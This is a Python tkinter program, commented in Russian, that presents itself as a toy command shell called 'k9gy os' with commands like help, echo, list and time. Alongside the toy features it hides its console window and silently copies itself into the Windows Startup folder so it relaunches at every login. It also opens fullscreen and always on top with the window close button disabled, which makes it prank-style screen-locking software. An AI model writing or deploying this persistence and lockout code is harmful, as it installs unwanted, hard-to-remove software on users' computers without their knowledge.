import tkinter as tk
from tkinter.scrolledtext import ScrolledText
import subprocess
import os
import datetime
import shutil
import sys
import ctypes

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def add_to_startup_folder():
    script_path = os.path.abspath(sys.argv[0])
    
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    
    try:
        shutil.copy2(script_path, startup_folder)
    except Exception as e:
         print("ошибка автозагрузки!")

def create_txt_file(filename, content):
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f"Файл '{filename}' успешно создан.")
    except Exception as e:
        print(f"Ошибка при создании файла: {e}")

result = subprocess.run('tasklist', shell=True, capture_output=True, text=True)

path = "C:\\"

current_time = datetime.datetime.now()

def send_command(event=None):
    command = entry.get()
    if not command:
        return  

    output_area.insert(tk.END, f"/user > {command}\n")  

    if os.path.isfile(command):
        try:
            with open(command, 'r', encoding='utf-8') as f:
                content = f.read()
            output_area.insert(tk.END, f"Содержимое файла {command}:\n{content}\n")
        except Exception as e:
            output_area.insert(tk.END, f"Ошибка при открытии файла: {e}\n")

    cmd_lower = command.lower()
    if cmd_lower == 'exit':
        root.destroy()
    elif cmd_lower == 'помощь' or cmd_lower == 'help':
        help_text = (
            "Доступные команды:\n"
            "help или помощь - справка\n"
            "clear - очистить экран\n"
            "echo <сообщение> - показать сообщение\n"
            "taskmgr - диспетчер задач\n"
            "sys - данные об ос\n"
            "list - просмотр диска\n"
            "time - показать время\n"
            "<имя файла в папке с ос> - открыть файл\n"
            "add file - добавит txt файл\n"
        )
        output_area.insert(tk.END, help_text)
    elif cmd_lower.startswith('echo '):
        message = command[5:]
        output_area.insert(tk.END, message + "\n")
    elif cmd_lower == 'clear':
        output_area.delete(1.0, tk.END)
    elif cmd_lower == 'taskmgr':
        taskmgr = (result.stdout)
        output_area.insert(tk.END, taskmgr)
    elif cmd_lower == 'sys':
        sys = (r"""
         00        00
         00       00
         00      00
         00     00             os: k9gy os
         00    00
         00   00
         00  00
         00 00
         00  00
         00   00               version:2.0
         00    00
         00     00
         00      00
         """)
        output_area.insert(tk.END, sys)
    elif cmd_lower == "list":
        files = os.listdir(path)
        fils = (f"{files}")
        output_area.insert(tk.END, fils)
    elif cmd_lower == 'time':
        time = (current_time.strftime("%H:%M:%S"))
        output_area.insert(tk.END, time)
    elif cmd_lower == 'add file':
        create_txt_file('k9gy os file.txt', 'edit this file')
    else:
        output_area.insert(tk.END, "Команда не распознана.\n")
    output_area.see(tk.END)
    entry.delete(0, tk.END)

root = tk.Tk()
root.title("k9gy os")
root.geometry("700x500")
root.configure(bg='black')
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.protocol("WM_DELETE_WINDOW", lambda: None)

output_area = ScrolledText(root, wrap='word', bg='black', fg='white', font=('Consolas', 10), height=3)
output_area.pack(fill=tk.BOTH, expand=True)

entry = tk.Entry(root, bg='black', fg='white', font=('Consolas', 30))
entry.pack(fill=tk.X, side=tk.BOTTOM)
entry.bind('<Return>', send_command)

if __name__ == "__main__":
   add_to_startup_folder()
   root.mainloop()